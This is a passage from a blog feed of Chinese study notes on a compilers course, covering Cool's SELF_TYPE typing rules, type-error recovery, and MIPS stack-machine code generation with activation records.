class="hljs-keyword">class</span> Count &#123;<br>    i : int &lt;- <span class="hljs-number">0</span>;<br>    inc () : Count &#123;<br>        &#123;<br>            i &lt;- i + <span class="hljs-number">1</span>;<br>            self;<br>        &#125;<br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>类Count包含一个计数器。</p></li><li><p>inc方法适用于任何子类。</p></li><li><p>考虑Count的子类Stock</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stock</span> inherits Count &#123; <br>name : String; -- name of item<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    Stock a &lt;- (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Stock</span>).inc();<br>    ... a.name ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>上述用法在已有的类型系统会报错，因为inc返回的类型是Count，但但是赋值的对象是Stock对象</p><ul><li><p>(new Stock).inc()具有动态类型Stock；</p></li><li><p>因此如下语句是合法的;</p><p>Stock a &lt;- (new Stock).inc()；</p></li><li><p>但这不是很好的类型系统，因为(newStock).inc()的静态类型为Count；</p></li><li><p>类型检查器“丢失”类型信息</p><ul><li>这使得继承inc毫无用处 ；</li><li>因此，我们必须为每个子类重新定义inc，并使用专门的返回类型 。</li></ul></li></ul><p>解决上述问题需要引入SELF_TYPE</p><p>我们将使用self type扩展类型系统：</p><ul><li>inc返回self；</li><li>因此，返回值与“self”具有相同的类型；</li><li>可以是Count或Count的任何子类型！</li></ul><p>引入关键字SELF_TYPE以用于此类函数的返回值，SELF_TYPE允许在继承inc时更改inc的返回类型</p><p>修改inc的声明：</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nim">inc(): <span class="hljs-type">SELF_TYPE</span> <span class="hljs-meta">&#123;...&#125;</span><br></code></pre></td></tr></table></figure><p>类型检查系统现在可以证明：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">O</span><span class="hljs-operator">,</span> <span class="hljs-variable">M</span><span class="hljs-operator">,</span> <span class="hljs-built_in">C</span> <span class="hljs-operator">|-</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-built_in">Count</span><span class="hljs-punctuation">)</span><span class="hljs-operator">.</span><span class="hljs-variable">inc</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> <span class="hljs-built_in">Count</span><br><span class="hljs-built_in">O</span><span class="hljs-operator">,</span> <span class="hljs-variable">M</span><span class="hljs-operator">,</span> <span class="hljs-built_in">C</span> <span class="hljs-operator">|-</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-variable">Stock</span><span class="hljs-punctuation">)</span><span class="hljs-operator">.</span><span class="hljs-variable">inc</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> <span class="hljs-variable">Stock</span><br></code></pre></td></tr></table></figure><p>注意SELF_TYPE不是动态类型</p><ul><li>它也不是类名；</li><li>它是静态类型；</li><li>帮助类型检查器更好地跟踪类型；</li><li>使类型检查器接受更正确的程序</li></ul><p>简而言之，拥有SELF_TYPE可以提高类型系统的表达能力。</p><p>What can be the dynamic type of the object returned by inc?（inc将返回什么样的动态类型）</p><ul><li>Answer: whatever could be the Count or any subclass of Count of'self'</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">B</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">C</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br></code></pre></td></tr></table></figure><p>In genreral, if SELF_TYPE appears textually in the class C as thedeclared type of E then</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dynamic_type</span><span class="hljs-params">(E)</span></span> &lt;= C<br></code></pre></td></tr></table></figure><blockquote><p>Note: The meaning of SELF_TYPE depends on where it appears , <spanclass="math inline">\(SELF\_TYPE_c\)</span> refers to an occurence ofSELF_TYPE in the body of C</p></blockquote><p><span class="math display">\[SELF\_TYPE_c &lt;= C\]</span></p><p>In type checking it is always safe to replace <spanclass="math inline">\(SELF\_TYPE_c\)</span> by C <spanclass="math display">\[SELF\_TYPE_c &lt;= SELF\_TYPE_c\]</span> in cool, we never compare SELF_TYPEs coming from differentclasses <span class="math display">\[SELF\_TYPE_c &lt;= T \quad if \quad C &lt;= T\]</span></p><ul><li><span class="math inline">\(SELF\_TYPE_c\)</span> can be any subtypeof c</li><li>This includes C itself</li><li>Thus this is the moe flexible rule we can allow</li></ul><p>let T and T' be any types but SELF_TYPE</p><ol type="1"><li><span class="math inline">\(lub(SELF\_TYPE_c, SELF\_TYPE_c) =SELF\_TYPE_c\)</span></li><li><span class="math inline">\(lub(SELF\_TYPE_c, T) = lub(C,T)\)</span></li><li><span class="math inline">\(lub(T, SELF\_TYPE_c) = lub(C,T)\)</span></li><li><span class="math inline">\(lub(T, T&#39;) defined asbefore\)</span></li></ol><p><strong>哪里使用SELF_TYPE</strong></p><p><strong>self type checking</strong></p><h2 id="错误恢复">错误恢复</h2><p>与解析一样，从类型错误中恢复也很重要</p><p>目标：</p><ul><li>What type is assigned to an expresson with no legitimate type ?</li><li>This type will influence the typing of the enclosing expression</li></ul><p><strong>方法1：</strong></p><p>assign type Object to ill-typed expressions</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">let y: Int &lt;- x + 2 in y + 2<br><span class="hljs-keyword">error: </span>x is undefind: =&gt; x is Object<br><span class="hljs-keyword">error: </span>+ applied to Object =&gt; x + 2 is Object <br><span class="hljs-keyword">error: </span>bad assimend =&gt; ... (Int and Object is incompatible)<br></code></pre></td></tr></table></figure><p><strong>方法2:</strong></p><p>introduce <code>No_type</code> for use with ill-typed expressions</p><ul><li>DefineNo_type &lt;= C for all types C</li><li>Every operation os defined for No_type<ul><li>With a. No_type result</li></ul></li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">let</span> y: Int &lt;- x + <span class="hljs-number">2</span> <span class="hljs-keyword">in</span> y + <span class="hljs-number">2</span><br>x <span class="hljs-keyword">is</span> No_type =&gt; x + <span class="hljs-number">2</span> <span class="hljs-keyword">is</span> No_type =&gt; <span class="hljs-literal">no</span> error becuse No_type <span class="hljs-keyword">is</span> subtype <span class="hljs-keyword">of</span> any type<br></code></pre></td></tr></table></figure><p>总结：</p><p>实际编译器也会使用类似No_type的东西</p><p>然而，引入No_type会带来跟多复杂性：类的继承结构将不再是树状，因为每个类都有一个子类</p><blockquote><p>cool里使用了第一种方案</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 7 Cool Gode Generation</title>
    <link href="/emocoder/2023/06/03/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%83/"/>
    <url>/emocoder/2023/06/03/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="代码生成简介">代码生成简介</h2><p>将ast转换为汇编代码，具体这里是mips汇编指令，cool里使用了累加寄存器<code>$a0</code></p><p>堆栈在内存中，，堆栈由高地址像低地址扩增</p><p>堆栈指针：<code>$sp</code> or <code>$29</code></p><p>具体的mips指令可以参考：misp文档</p><p>定义简单函数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(x) = if x = <span class="hljs-number">1</span> then <span class="hljs-number">0</span> else <br> <span class="hljs-attribute">if</span> x = <span class="hljs-number">2</span> then <span class="hljs-number">1</span> else<br> <span class="hljs-attribute">fib</span>(x-<span class="hljs-number">1</span>) + fib(x-<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>对于每一个表达式e，可以生成如下MISP代码：</p><ul><li>Computes the value of e in<code>$a0</code>（计算表达式e的值，并存储在<code>$a0</code>寄存器中）</li><li>Preservers <code>$sp</code> and the contents of stack(维护<code>$sp</code> 指针)</li></ul><p>这样我们可以定义<code>cgen(e)</code>表示为e的代码生成，并在最后将e的值存于<code>$a0</code> 中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cgen</span><span class="hljs-params">(i)</span></span> = <span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a0</span> i<br></code></pre></td></tr></table></figure><blockquote><p>代码生成是在编译阶段</p><p>汇编代码的执行是在运行时</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(e1 + e2) = <br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>cgen(e2)<br><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t1</span> <span class="hljs-number">4</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">t1</span> $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>其实也就是输出对应的汇编代码</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dart">cgen(e1 + e2) = <br>cgen(e1)<br>cout &lt;&lt; <span class="hljs-string">&#x27;sw <span class="hljs-subst">$a0</span> 0(<span class="hljs-subst">$sp</span>)&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;addiu <span class="hljs-subst">$sp</span> <span class="hljs-subst">$sp</span> -4;&#x27;</span><br>cgen(e2)<br>cout &lt;&lt; <span class="hljs-string">&#x27;lw <span class="hljs-subst">$t1</span> 4(<span class="hljs-subst">$sp</span>)&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;add <span class="hljs-subst">$a0</span> <span class="hljs-subst">$t1</span> <span class="hljs-subst">$a0</span>&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;addiu <span class="hljs-subst">$a0</span> <span class="hljs-subst">$sp</span> 4&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li>上面为+生成汇编代码的过程，可以理解为是一个模板，其中cgen(e1)和cgen(e2)就是插槽</li><li>代码生成是递归的，e1和e2也可继续向下生成代码</li><li>代码生成可以是沿着AST自顶向下递归的，至少对于表达式是可以的</li></ul><p>下面看一个函数的例子，函数有调用和函数定义两部分，这两者都依赖于AR(Activerecord or function frame)</p><p>简单的栈zhen满足如下规则即可：</p><ul><li>结果总是存储在<code>$a0</code>中，比如两者之和就可以存于<code>$a0</code> 中</li><li>栈zhen包含实际参数，也就是<code>f(x1, x2, ... xn)</code> 将会push<code>xn, ... x1</code> 入栈</li><li>在这个简单的例子只设计参数，不包含局部变量</li><li>另外，对于mips架构，需要在栈zhen内记录函数的返回地址</li><li>记录函数栈zhen起始地址：<code>fp</code></li><li>mips跳转指令：<code>jal label</code></li></ul><p>对于函数调用：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(f(e1, ... en)) = <br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">fp</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>cgen(en)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>...<br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br><span class="hljs-keyword">jal </span>f_entry<br></code></pre></td></tr></table></figure><ul><li>函数调用的时候，保存了fp</li><li>逆序保存了实际参数</li><li>函数跳转的时候，返回地址<code>$ra</code>是自动保存的，这是底层实现的，我们不用管</li><li>一个使用了多少空间：4*n + 4 bytes,n是参数个数，+4是一个<code>fp</code> 指针</li></ul><p>对于函数定义：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cgen(def f(x1, ... xn) = e) = <br>move <span class="hljs-variable">$fp</span> <span class="hljs-variable">$sp</span> <span class="hljs-regexp">//</span> 新的函数起始地址<br><span class="hljs-variable">$w</span> <span class="hljs-variable">$ra</span> <span class="hljs-number">0</span>(<span class="hljs-variable">$sp</span>) <span class="hljs-regexp">//</span> 保存返回地址<br>addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> -<span class="hljs-number">4</span> <span class="hljs-regexp">//</span> 扩增<br>cgen(e) <span class="hljs-regexp">//</span> 递归生成e<br>lw <span class="hljs-variable">$ra</span> <span class="hljs-number">4</span>(<span class="hljs-variable">$sp</span>) <span class="hljs-regexp">//</span> 加载返回地址<br>addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> z <span class="hljs-regexp">//</span> 恢复栈空间<br>jal <span class="hljs-variable">$ra</span> <span class="hljs-regexp">//</span> 跳转回去<br></code></pre></td></tr></table></figure><ul><li>fp在高地址处</li><li>callee（被调用者）</li><li>z = 4 * n + 8，n是实际参数，8是<code>$ra</code> 和<code>$fp</code></li></ul><p>上面的实现方式可以实现简单函数：</p><ul><li>函数不存在局部变量，仅仅有参数</li><li>实际参数是caller push入栈的</li></ul><p>存在问题：计算的中间结果放在栈内，变量(参数)并不能基于$sp进行偏移量查询，因为不好确定使用了多少中间变量</p><p>解决方法：使用fp查询变量(参数)</p><ul><li>fp始终指向返回地址，这样不管栈怎么扩增，fp是不变的，我们可以始终基于fp查询变量（参数）</li></ul><p>xi表示第i个实际参数，那么关于xi的代码生成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">cgen</span><span class="hljs-params">(xi)</span> = </span><br><span class="hljs-function"><span class="hljs-title">lw</span> $<span class="hljs-title">a0</span> <span class="hljs-title">z</span><span class="hljs-params">($fp)</span> <span class="hljs-params">(z = <span class="hljs-number">4</span> * i)</span></span><br></code></pre></td></tr></table></figure><p>🌰：<code>def f(x, y) = e</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[<br>old <span class="hljs-built_in">fp</span>,<br>y,<br>x,<br>return <span class="hljs-keyword">addr, </span>&lt;= <span class="hljs-built_in">fp</span><br>? &lt;= <span class="hljs-built_in">sp</span><br>]<br>X is <span class="hljs-built_in">at</span> <span class="hljs-built_in">fp</span> + <span class="hljs-number">4</span><br>Y is <span class="hljs-built_in">at</span> <span class="hljs-built_in">fp</span> + <span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p>现实中的寄存器：</p><ul><li>尽量将值保存在寄存器中，因为更快</li><li>中间值是被设计在AR中，有着一定的排列方式，可以在后续章节中看到如何使用临时变量，并把临时变量存在AR中，而非一味地push和pop</li></ul><p>来看一个完整的例子：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">sumto</span>(<span class="hljs-variable">x</span>) = <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">x</span> = <span class="hljs-number">0</span> <span class="hljs-variable">then</span> <span class="hljs-number">0</span> <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-variable">x</span> + <span class="hljs-title">sumto</span>(<span class="hljs-variable">x</span> – <span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><p>为以上函数生成代码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#x in ra</span><br>sumto_entry:<br>move<span class="hljs-variable">$fp</span><span class="hljs-variable">$sp</span>#<span class="hljs-attribute">fp</span>=sp<br>sw<span class="hljs-variable">$ra</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=ra<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(sp+4)(a0=x)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>li<span class="hljs-variable">$a0</span>0#<span class="hljs-attribute">a0</span>=0<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(sp+4)(t1=a0=x)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>+4#sp+=4<br>beq<span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span>true1#<span class="hljs-keyword">if</span> <span class="hljs-attribute">a0</span>=t1, goto true1<br>false1:#x <span class="hljs-keyword">in</span> sp - 4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(4+fp)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>sw<span class="hljs-variable">$fp</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=fp<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(4+fp)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>li<span class="hljs-variable">$a0</span>1#<span class="hljs-attribute">a0</span>=1<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(4+sp)<br>sub<span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span><span class="hljs-variable">$a0</span>#<span class="hljs-attribute">a0</span>=t1-a0(a0=x-1)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>4#sp+=4<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>jalsumto_entry#goto sumto_entry<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(4+sp)<br><span class="hljs-built_in">add</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span><span class="hljs-variable">$a0</span>#<span class="hljs-attribute">a0</span>=t1+a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>4#sp+=4<br>jalendif1<br>true1:<br>li<span class="hljs-variable">$a0</span>0#<span class="hljs-attribute">a0</span>=0<br>endif1:#恢复调用前的状态<br>lw<span class="hljs-variable">$ra</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">ra</span>=*(4+sp)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>12#sp+=12<br>lw<span class="hljs-variable">$fp</span>0(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">fp</span>=*sp<br>jr<span class="hljs-variable">$ra</span>#goto<span class="hljs-built_in"> address </span><span class="hljs-keyword">in</span> ra<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>AR必须和代码生成器一同设计</li><li>代码生成可以通过遍历AST递归做到</li><li>推荐使用堆栈机生成代码，比较简单，大多数语言都是如此</li></ul><p>运行时组织：主要是为了组织运行时代码(狭义指运行时代码生成)</p><p>代码生成的目标：准确和快</p><p>代码生成的两个假设：</p><ul><li>代码执行是串行的，即从上至下一个语句接着一个语句按照既定的顺序执行</li><li>当程序被调用结束后，控制权应该交给执行本次调用的后一条语句</li></ul><p>当然有些语言违背了这两条假设，比如说并行</p><p>变量x的生命周期：变量x起作用的一段范围（生命周期是一个动态（运行时）概念，而作用域是一个静态概念）</p><h2 id="rutime-organization">Rutime Organization</h2><p>主要是组织代码生成的设计及相关计算模型，涉及以下内容：</p><ul><li>运行时的资源管理</li><li>存储管理</li><li>运行时的计算模型</li></ul><p>前面已经讲述三部分内容：</p><ul><li>Lexical analysis</li><li>parsing</li><li>semantic analysis</li></ul><p><strong>这三部分都是加强语言定义的方式</strong></p><p>程序的执行方式：</p><ol type="1"><li>OS为该程序分配空间</li><li>代码北加州到这部分空间</li><li>OS跳转到程序的入口</li></ol><p>程序的内存布局： <imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042401.jpg?raw=true"alt="img" /></p><p>如上，按照传统方式，程序的内存布局如下，上面图片是简化的，实际情况下内存不一定是连续的：</p><ul><li><p>顶部的低地址是代码段</p></li><li><p>底部的高地址</p></li></ul><p>代码生成的目标：</p><ul><li>生成正确的代码</li><li>生成的代码快</li></ul><p>传统意义上里生成的代码基于以下两个假设：</p><ul><li>执行是顺序的，控制流从程序中的一个位置按定义好的顺序移动到另一个位置。</li><li>调用过程时，控制流总是返回到调用后的位置。</li></ul><blockquote><p>当然有的程序语言违背了这两个假设，比如可并行运行的语言</p></blockquote><p><strong>程序的激活</strong></p><p>激活：对子程序P的调用，称之为对P的激活，P的激活的生命周期为执行P的所有步骤（变量x的生命周期是定义x的执行部分）</p><blockquote><p>生命周期是一个动态的运行时概念，而作用域是一个静态概念</p></blockquote><p>对于非并行程序，激活是线性的</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">Class</span> <span class="hljs-variable">Main</span> &#123;<br>    <span class="hljs-function"><span class="hljs-title">g</span>() : <span class="hljs-variable">Int</span> &#123; <span class="hljs-number">1</span> &#125;;</span><br><span class="hljs-function">    <span class="hljs-title">f</span>(<span class="hljs-variable">x</span>:<span class="hljs-variable">Int</span>): <span class="hljs-variable">Int</span> &#123; <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">x</span> = <span class="hljs-number">0</span> <span class="hljs-variable">then</span> <span class="hljs-title">g</span>() <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-title">f</span>(<span class="hljs-variable">x</span> - <span class="hljs-number">1</span>) <span class="hljs-variable">fi</span>&#125;; </span><br><span class="hljs-function">    <span class="hljs-title">main</span>(): <span class="hljs-variable">Int</span> &#123;&#123;<span class="hljs-title">f</span>(<span class="hljs-number">3</span>); &#125;&#125;;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>以上代码生成的激活记录如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">main -&gt; f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">3</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> g<br></code></pre></td></tr></table></figure><p>基于此，因此堆栈可以跟踪整个激活记录的过程</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042404.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><strong>激活记录（栈zhen）</strong></p><p>管理一个过程激活所需的信息称为激活记录（AR）或栈帧（frame）</p><p>如果过程F调用G，则G的激活记录包含F和G的混合信息。</p><ul><li>F被“暂停”，直到G完成，此时F恢复。</li><li>G的AR包含如下内容所需的信息<ul><li>完成G的执行</li><li>恢复执行F</li><li>G返回值的空间</li><li>实际参数</li><li>指向上一个激活记录的指针<ul><li>控制链接； 指向G的caller的AR</li></ul></li><li>调用G之前的机器状态<ul><li>寄存器和程序计数器的内容</li><li>局部变量</li></ul></li><li>其他临时值</li></ul></li><li>将返回值放在第一个栈帧中的优点是，调用方可以在与自己的帧相距固定偏移量的位置找到它；</li><li>这个组织没有什么特殊的地方<ul><li>可以重新排列栈帧元素的顺序；</li><li>可以不同地划分caller/call的职责；</li><li>如果组织能够提高执行速度或简化代码生成，那么它会更好。</li></ul></li><li>真正的编译器将尽可能多的栈帧保存在寄存器中<ul><li>特别是方法的结果和参数。</li></ul></li><li>编译器必须在编译时确定激活记录的布局，并生成可正确访问激活记录中位置的代码。</li><li>因此，AR布局和代码生成器必须一起设计！</li></ul><h2 id="全局变量和堆">全局变量和堆</h2><ul><li>所有对全局变量的引用都指向同一个对象<ul><li>所以无法在激活记录中存储全局变量，因为当前AR结束后，全局变量依旧存在</li></ul></li><li>因此需要为全局变量分配一次固定地址<ul><li>具有固定地址的变量是“静态分配的”。</li></ul></li><li>根据语言，可能还有其他静态分配的值</li></ul><p>动态分配的值不能存放在AR中，Bar值必须在foo的AR释放后依然存在，因为foo的调用者可能使用Bar。：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span 